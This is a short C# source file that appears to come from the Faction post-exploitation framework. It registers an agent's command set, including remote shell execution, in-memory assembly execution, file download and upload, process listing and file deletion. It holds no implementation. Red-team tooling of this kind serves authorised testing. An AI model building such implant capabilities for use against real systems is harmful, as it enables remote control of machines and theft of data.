using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Faction.Modules.Dotnet.Common;
using Faction.Modules.Dotnet.Commands;

namespace Faction.Modules.Dotnet
{
  public class Initialize
  {
    public static List<Command> GetCommands()
    {
      List<Command> commands = new List<Command>();
      commands.Add(new ChangeDirectory());
      commands.Add(new Download());
      commands.Add(new ExecuteAssembly());
      commands.Add(new GetCurrentDirectory());
      commands.Add(new ListFiles());
      commands.Add(new ListProcesses());
      commands.Add(new MakeDirectory());
      commands.Add(new RmCommand());
      commands.Add(new ShellCommand());
      commands.Add(new Upload());
      commands.Add(new WhoAmI());
      return commands;
    }
  }
}
